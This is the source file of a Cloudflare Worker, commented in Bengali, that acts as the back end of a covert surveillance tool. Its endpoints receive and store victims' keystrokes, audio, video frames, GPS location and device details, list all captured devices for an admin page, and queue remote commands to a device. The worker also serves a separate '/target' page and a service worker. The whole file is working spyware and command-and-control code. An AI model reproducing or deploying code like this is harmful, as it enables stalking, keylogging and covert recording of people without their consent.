from workers import WorkerEntrypoint, Response
from pathlib import Path
from urllib.parse import urlparse
import json
import time

class Default(WorkerEntrypoint):
    async def fetch(self, request, env):
        url = urlparse(request.url)
        path = url.path.rstrip("/")

        cors_headers = {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        }

        # ১. ডেটা রিসিভ করা এবং D1-এ সেভ করা
        if path == "/api/update" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("id", "unknown_device")
                now = time.time()
                
                # চেক করা ডিভাইস আগে থেকে আছে কিনা
                existing = await env.DB.prepare("SELECT id FROM devices WHERE id = ?").bind(client_id).first()
                
                if existing:
                    # আপডেট করা
                    if "video_frame" in data:
                        await env.DB.prepare("UPDATE devices SET video_frame = ?, video_time = ?, lastPing = ? WHERE id = ?").bind(
                            data["video_frame"], data.get("time", ""), now, client_id
                        ).run()
                    elif "audio_data" in data:
                        await env.DB.prepare("UPDATE devices SET audio_data = ?, audio_time = ?, lastPing = ? WHERE id = ?").bind(
                            data["audio_data"], data.get("time", ""), now, client_id
                        ).run()
                    elif "keystrokes" in data:
                        await env.DB.prepare("UPDATE devices SET keystrokes = ?, lastPing = ? WHERE id = ?").bind(
                            data["keystrokes"], now, client_id
                        ).run()
                    else:
                        await env.DB.prepare("UPDATE devices SET lat = ?, lng = ?, accuracy = ?, device = ?, browser = ?, battery = ?, charging = ?, lastSeen = ?, lastPing = ? WHERE id = ?").bind(
                            data.get("lat"), data.get("lng"), data.get("accuracy", 0),
                            data.get("device", "Unknown"), data.get("browser", "Unknown"),
                            data.get("battery", "N/A"), data.get("charging", "N/A"),
                            data.get("time", ""), now, client_id
                        ).run()
                else:
                    # নতুন ডিভাইস যোগ করা
                    await env.DB.prepare("INSERT INTO devices (id, lat, lng, accuracy, device, browser, battery, charging, lastSeen, lastPing) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)").bind(
                        client_id, data.get("lat"), data.get("lng"), data.get("accuracy", 0),
                        data.get("device", "Unknown"), data.get("browser", "Unknown"),
                        data.get("battery", "N/A"), data.get("charging", "N/A"),
                        data.get("time", ""), now
                    ).run()
                
                return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        # ২. ডিভাইস লিস্ট (কখনো মুছবে না)
        if path == "/api/clients" and request.method == "GET":
            try:
                result = await env.DB.prepare("SELECT * FROM devices").all()
                clients = {}
                for row in result.results:
                    clients[row["id"]] = row
                return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=500, headers={**cors_headers, "Content-Type": "application/json"})

        # ৩. কমান্ড পাঠানো
        if path == "/api/command" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("client_id")
                command = data.get("command")
                await env.DB.prepare("UPDATE devices SET command = ? WHERE id = ?").bind(command, client_id).run()
                return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        if request.method == "OPTIONS":
            return Response("", headers=cors_headers)

        # ৪. HTML ফাইল সার্ভ করা
        if path in ("", "/"):
            return Response(self.read_file("admin.html"), headers={"Content-Type": "text/html; charset=utf-8"})
        
        if path == "/target":
            return Response(self.read_file("target.html"), headers={"Content-Type": "text/html; charset=utf-8"})
        
        if path == "/manifest.json":
            return Response(self.read_file("manifest.json"), headers={"Content-Type": "application/manifest+json"})
        
        if path == "/service-worker.js":
            return Response(self.read_file("service-worker.js"), headers={"Content-Type": "application/javascript"})

        return Response("Not Found", status=404)

    def read_file(self, filename):
        file_path = Path(__file__).parent / "templates" / filename
        try:
            return file_path.read_text(encoding="utf-8")
        except Exception as e:
            return f"<h1>Error reading file: {str(e)}</h1>"
